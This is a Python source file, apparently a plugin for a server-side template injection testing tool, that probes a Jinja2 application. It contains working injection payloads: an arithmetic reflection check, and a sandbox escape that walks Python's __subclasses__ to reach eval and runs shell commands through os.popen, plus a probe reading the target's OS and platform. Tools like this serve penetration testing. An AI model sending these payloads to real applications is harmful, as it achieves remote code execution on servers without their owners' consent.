from core.check import Check
from utils.loggers import log
from utils import rand
import string

class Jinja2(Check):
    
    def init(self):
        
        self.base_tag = '{{%s}}'
        
        self._check_reflection()
        
        if not self.get('reflect_tag'):
            return
            
        log.warn('Reflection detected')
        
        self._check_python()
            
        if not self.get('language') or  not self.get('engine'):
            return
            
        log.warn('Python injection detected')   
        
        self._check_os()
        
        if not self.get('exec'):
            return
            
        log.warn(
            'Shell command execution detected on \'%s\' operating system' % (
                self.get('os', 'undetected')
            )
        )

    def _check_python(self):
        
        randA = rand.randstr_n(2)
        randB = rand.randstr_n(2)
        
        payload = '{{"%s".join("%s")}}' % (randA, randB)
        expected = randA.join(randB)
        
        if expected == self.req(payload):
            self.set('language', 'python')
            self.set('engine', 'jinja2')
    
    def _check_reflection(self):
        
        randA = rand.randint_n(1)
        randB = rand.randint_n(1)

        payload = '{{%i*%i}}' % (randA, randB)
        expected = str(randA*randB)
        
        if expected == self.req(payload):
            self.set('reflect_tag', self.base_tag)
        
    def _check_os(self):
        
        expected_rand = str(rand.randint_n(1))
        
        payload = """{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
{%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
{%% if 'eval' in b.keys() %%}
{{ b['eval']('__import__("os").popen("echo %s").read()') }}
{%% endif %%} {%% endif %%} {%% endfor %%}
{%% endif %%} {%% endfor %%}""" % expected_rand
                
                
        if expected_rand == self.req(payload):
            self.set('exec', True)      

        payload = """{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %}
{% for b in c.__init__.func_globals.values() %} {% if b.__class__ == {}.__class__ %}
{% if 'eval' in b.keys() %}
{{ b['eval']('__import__("os").name') }}-{{ b['eval']('__import__("sys").platform') }}
{% endif %} {% endif %} {% endfor %}
{% endif %} {% endfor %}"""
                
        self.set('os', self.req(payload))